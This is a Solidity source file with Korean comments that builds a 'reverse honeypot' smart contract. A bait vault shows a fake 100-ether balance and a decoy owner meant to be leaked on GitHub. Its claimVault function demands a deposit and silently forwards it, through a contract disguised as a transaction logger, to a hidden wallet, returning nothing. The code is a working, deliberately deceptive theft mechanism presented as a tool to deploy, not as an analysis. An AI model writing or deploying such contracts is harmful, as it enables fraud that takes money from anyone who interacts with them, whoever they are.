// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Logger (Hidden Trapdoor)
 * @dev 겉보기엔 단순한 로그 기록기 같지만, 실제로는 해커의 입금액을
 *      사령관님의 메인 지갑으로 빼돌리는 치명적인 백도어(Backdoor)입니다.
 */
contract Logger {
    address payable public commanderWallet;
    
    constructor(address _wallet) {
        commanderWallet = payable(_wallet);
    }
    
    // 해커의 눈을 속이는 위장 함수 이름 (로그를 남기는 척하면서 돈을 훔침)
    function logTransaction() public payable {
        // 해커가 보낸 가스비/보증금(msg.value)을 사령관님의 진짜 지갑으로 다이렉트 전송!
        commanderWallet.transfer(msg.value);
    }
}

/**
 * @title VulnerableVault (Reverse Honeypot)
 * @dev 해커 봇들을 유인하기 위해 고의로 허술하게 만들어진 미끼 금고입니다.
 *      하지만 안에는 해커의 돈을 빼앗는 '리버스 허니팟' 트랩이 설치되어 있습니다.
 */
contract VulnerableVault {
    address public decoyOwner;
    Logger public hiddenLogger;
    
    uint256 public fakeVaultBalance;

    // 사령관님의 진짜 메인 지갑 주소를 비밀리에 등록합니다. (배포 시에만 입력하며 코드에는 남기지 않습니다.)
    constructor(address _trueCommanderWallet) {
        decoyOwner = msg.sender; // 깃허브에 일부러 유출시킬 미끼 계정
        hiddenLogger = new Logger(_trueCommanderWallet);
        fakeVaultBalance = 100 ether; // 해커를 흥분시킬 가짜 잔고 표시 (100 BNB)
    }

    /**
     * @dev 해커가 가장 먼저 호출하게 될 미끼 함수 (Bait Function)
     * 해커 봇은 이 함수를 호출하면 금고의 모든 돈을 자기가 훔칠 수 있다고 착각합니다.
     */
    function claimVault() public payable {
        // 해커에게 "최소 0.05 BNB 이상을 보증금으로 입금하라"고 요구
        require(msg.value >= 0.05 ether, "Error: Must deposit at least 0.05 BNB to unlock vault");
        
        // 🚨 [TRAP ACTIVATED] 🚨
        // 해커가 보증금을 전송하는 순간, 숨겨둔 로거(Logger)를 호출해 
        // 사령관님의 지갑으로 해커의 돈을 즉시 빼돌립니다!
        hiddenLogger.logTransaction{value: msg.value}();
        
        // 그리고 해커에게는 아무것도 주지 않고 함수를 끝내버립니다. (해커는 빈털터리가 됨)
    }
    
    // 해커를 안심시키기 위한 가짜 출금 함수 (아무 짝에도 쓸모없음)
    function withdraw() public {
        require(msg.sender == decoyOwner, "Only owner can withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }
}
